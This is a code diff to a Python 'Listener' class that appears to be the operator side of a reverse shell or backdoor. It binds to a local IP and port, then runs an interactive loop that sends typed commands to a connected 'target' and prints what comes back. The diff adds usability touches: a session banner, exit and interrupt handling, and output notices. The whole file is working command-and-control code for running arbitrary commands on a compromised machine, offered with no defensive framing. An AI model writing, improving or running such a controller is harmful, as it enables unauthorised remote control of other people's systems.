@@ -81,18 +81,38 @@ class Listener:
                 continue
 
     def run(self):
+        print("\n[+] Interactive command session started")
+        print("[*] Type 'exit' to close the connection")
+        print("-" * 50)
+
         while True:
-            command = input(">> ")
+            try:
+                command = input("listener@target $ ").strip()
 
-            self.reliable_send({"cmd": command})
+                if not command:
+                    continue
 
-            if command == "exit":
+                self.reliable_send({"cmd": command})
+
+                if command == "exit":
+                    print("[*] Closing connection...")
+                    self.connection.close()
+                    break
+
+                result = self.reliable_receive()
+
+                output = result.get("output", "")
+                if output:
+                    print(output)
+                else:
+                    print("[*] Command executed with no output")
+
+                print("-" * 50)
+
+            except KeyboardInterrupt:
+                print("\n[*] Interrupted by user, closing connection.")
                 self.connection.close()
                 break
-
-            result = self.reliable_receive()
-            print(result.get("output", ""))
-
 
 listener = Listener(options.local_ip, options.port)
 listener.run()
